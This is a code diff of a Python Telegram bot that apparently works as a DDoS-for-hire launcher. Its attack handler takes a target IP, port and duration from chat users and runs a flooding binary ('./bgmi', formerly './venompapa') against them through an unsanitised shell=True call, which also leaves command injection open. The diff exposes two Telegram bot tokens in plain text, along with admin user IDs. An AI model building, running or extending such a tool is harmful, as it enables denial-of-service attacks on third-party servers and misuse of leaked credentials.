@@ -6,7 +6,7 @@ import subprocess
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 # Initialize the bot with your bot's API token
-bot = telebot.TeleBot('7932053303:AAFt0CiG_B_VRR4QynZ2r9SmyP6r3MiX69Q')
+bot = telebot.TeleBot('7775840737:AAFmUfq_O-IctYTJ13ErkiJ-_8XQqiGL-dA')
 
 # Admin user IDs (replace with your own admin IDs as strings)
 admin_ids = ["6768273586","2007860433"]
@@ -172,7 +172,7 @@ def handle_attack_command(message):
                 log_command(user_id, target_ip, target_port, duration)
 
                 # Simulate the attack command (replace with actual command if needed)
-                full_command = f"./venompapa {target_ip} {target_port} {duration}"
+                full_command = f"./bgmi {target_ip} {target_port} {duration}"
                 subprocess.run(full_command, shell=True)
 
                 bot.reply_to(message, f"🚀 Attack Finished. 🚀 \n\nTarget: {target_ip}\nPort: {target_port}\nTime: {duration}")
